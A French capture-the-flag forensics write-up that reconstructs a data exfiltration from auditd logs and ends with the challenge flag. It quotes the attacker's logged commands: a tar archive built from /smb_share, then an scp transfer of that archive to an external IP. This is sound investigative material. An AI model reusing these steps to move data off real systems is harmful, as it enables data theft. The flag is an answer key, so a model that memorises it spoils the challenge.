# FCFS 2026 - Forensics - Grhelp Exfiltration

- **Catégorie :** Forensics

- **Description :** L'attaquant aurait finalement réalisé une exfiltration sur la machine backupfiler. Pouvez-vous identifier : l'outil utilisé pour exfiltrer les données, le chemin absolu du fichier exfiltré, l'heure à laquelle les données avaient été préalablement préparées pour l'exfiltration (YYYY-MM-DDTHH:MM:SS en UTC) ? Le flag est la concaténation des trois réponses : `FCSC{tool-filepath-YYYY-MM-DDTHH:MM:SS}`, [`grhelp-logs-exfil.tar.gz`](grhelp-logs-exfil.tar.gz)

- **Résumé de l'analyse :** Utilisation de `scp` pour transférer une archive compressée `/tmp/smb_share.tar.gz` vers l'IP externe de l'attaquant.

## Analyse

### 1. Préparation des données
Les logs `auditd` sont répartis dans plusieurs fichiers. On les regroupe pour faciliter la recherche :

```Bash
cat logs/linux/*.log > all.log
```

### 2. Filtrage et identification de la cible
Nous ciblons spécifiquement la machine `backupfiler` en excluant le bruit généré par les agents de maintenance (Azure, sysstat) et les utilitaires système classiques :

```Bash
grep "node=backupfiler" all.log | grep "type=EXECVE" | grep -vE "waagent|WALinuxAgent|systemd|iptables|dpkg"
```

### 3. Extraction de la commande d'exfiltration
En cherchant des mots-clés liés au transfert de fichiers (curl, scp, wget), on isole la ligne suivante :

```Plaintext
node=backupfiler.jurisdefense.intra type=EXECVE msg=audit(1747213691.971:338148): argc=4 a0="scp" a1="/tmp/smb_share.tar.gz" a2="15.188.57.187"
```

- Outil (a0) : `scp`

- Fichier (a1) : `/tmp/smb_share.tar.gz`

- Destination (a2) : `15.188.57.187 (IP de l'attaquant)`

### 4. Datation de l'incident
L'attaquant a créé l'archive juste avant l'exfiltration. En filtrant sur le nom du fichier, on obtient la chronologie exacte via les timestamps Unix :

```Bash
grep "smb_share.tar.gz" all.log | grep "tar"
# msg=audit(1747213513.472:338023) -> tar cvzf smb_share.tar.gz /smb_share
```
Le timestamp `1747213513` correspond au `2025-05-14 09:05:13`.

## Interprétation

L'attaquant a procédé de manière méthodique :

1. Compression : Regroupement du contenu de `/smb_share` dans une archive dans `/tmp`.

2. Exfiltration : Envoi vers son serveur via `scp`.

3. Nettoyage : Suppression de l'archive locale via `rm` (constaté dans les logs ultérieurs).

## Flag

```Plaintext
FCSC{scp-/tmp/smb_share.tar.gz-2025-05-14T09:05:13}
```